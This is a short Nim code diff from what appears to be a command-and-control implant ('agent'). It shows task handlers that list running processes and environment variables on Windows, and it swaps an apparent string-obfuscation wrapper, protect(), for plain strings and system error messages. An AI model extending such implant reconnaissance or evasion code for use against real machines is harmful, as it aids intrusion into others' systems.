@@ -52,7 +52,7 @@ when defined(agent):
 
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
         
-        print protect("   [>] Listing running processes.")
+        print "   [>] Listing running processes."
         
         try: 
             var processes: seq[DWORD] = @[]
@@ -62,7 +62,7 @@ when defined(agent):
             # Take a snapshot of running processes
             let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
             if hSnapshot == INVALID_HANDLE_VALUE: 
-                raise newException(CatchableError, protect("Invalid permissions."))
+                raise newException(CatchableError, GetLastError().getError)
             
             # Close handle after object is no longer used
             defer: CloseHandle(hSnapshot)
@@ -72,7 +72,7 @@ when defined(agent):
 
             # Loop over processes to fill the map            
             if Process32First(hSnapshot, addr pe32) == FALSE:
-                raise newException(CatchableError, protect("Failed to get processes."))
+                raise newException(CatchableError, GetLastError().getError)
             
             while true: 
                 var procInfo = ProcessInfo(
@@ -126,7 +126,7 @@ when defined(agent):
 
     proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 
 
-        print protect("   [>] Displaying environment variables.")
+        print "   [>] Displaying environment variables."
 
         try: 
             var output: string = ""
